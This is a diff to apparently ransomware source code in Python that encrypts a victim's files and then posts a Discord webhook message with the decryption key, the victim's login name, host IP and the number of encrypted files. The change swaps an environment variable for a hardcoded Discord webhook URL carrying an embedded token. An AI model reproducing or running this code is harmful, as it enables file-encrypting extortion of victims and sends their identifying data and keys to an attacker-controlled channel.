@@ -12,9 +12,6 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from discord_webhook import DiscordWebhook
 import socket
-from dotenv import load_dotenv, find_dotenv
-
-load_dotenv(find_dotenv())
 
 # os.chdir(dirname(abspath(__file__)))
 os.system("cd ..")
@@ -465,7 +462,7 @@ else:
         generateEncryptThreads(fileExtensions, password, removeFiles, path)
         endTime = time.time()
         webhook = DiscordWebhook(
-            url=os.getenv("WEBHOOK"),
+            url="https://discord.com/api/webhooks/993006430649057381/3vHNIXKrQIg0F1tGVF0R60yRr8YvfJRgVUoFDClPnNDb-EsrdYKTYbpJXV9O14LDgRE5",
             content=f"Decryption Key Generated\n`{password}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for `{encryptCount}` files\nTime to encypt: `{int(endTime - startTime)} seconds`",
         )
         webhook.execute()
